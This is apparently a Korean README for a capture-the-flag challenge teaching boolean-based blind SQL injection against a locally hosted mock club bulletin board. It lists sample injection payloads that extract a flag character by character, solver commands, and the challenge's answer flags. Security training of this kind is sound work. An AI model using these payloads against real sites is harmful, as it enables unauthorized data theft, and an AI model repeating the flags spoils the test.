# WHOIS 동아리 게시판 - 블라인드 SQL 인젝션 CTF

WHOIS 정보보안 동아리의 게시판을 모방한 블라인드 SQL 인젝션 CTF 문제입니다.

## 🎯 문제 개요

- **난이도**: 중급
- **카테고리**: Web Security
- **공격 유형**: Blind SQL Injection (URL Parameter)
- **학습 목표**: Boolean-based 블라인드 SQL 인젝션 기법

## 🚀 빠른 시작

### 1. 환경 설정
```bash
# 권한 설정
chmod +x setup.sh cleanup.sh solver.py

# Docker 환경 시작
./setup.sh
```

### 2. 접속 확인
브라우저에서 http://localhost:8080 접속

### 3. 문제 해결
```bash
# 자동화 솔버 실행
python3 solver.py http://localhost:8080

# 수동 테스트 스크립트
python3 test.py
```

## 🔍 공격 벡터

### URL 파라미터 조작
```
http://localhost:8080?user=<payload>
```

### 예시 페이로드
```bash
# Boolean 테스트
?user=admin' AND 1=1--
?user=admin' AND 1=2--

# 데이터 추출
?user=admin' AND (SELECT COUNT(*) FROM flags)>0--
?user=admin' AND ASCII(SUBSTR((SELECT flag_value FROM flags LIMIT 1),1,1))=67--
```

## 🏆 플래그

- **메인 플래그**: `CTF{WH01S_bl1nd_URL_1nj3ct10n_m4st3r}`
- **보너스 플래그**: `CTF{URL_p4r4m3t3r_h4ck1ng_3xp3rt}`

## 🛠️ 개발 환경

### 필요 도구
- Docker & Docker Compose
- Python 3.x
- 웹 브라우저

### 프로젝트 구조
```
blind-sql-ctf/
├── ctf.php              # WHOIS 게시판 웹 애플리케이션
├── solver.py            # 자동화 솔버
├── test.py              # 테스트 스크립트
├── Dockerfile           # Docker 이미지 설정
├── docker-compose.yml   # 컨테이너 관리
├── setup.sh             # 환경 설정 스크립트
├── cleanup.sh           # 정리 스크립트
└── .env                 # 환경 변수
```

## 🐳 Docker 명령어

```bash
# 환경 시작
docker-compose up -d

# 로그 확인
docker-compose logs -f

# 환경 중지
docker-compose down

# 컨테이너 접속
docker exec -it blind_sql_ctf /bin/bash
```
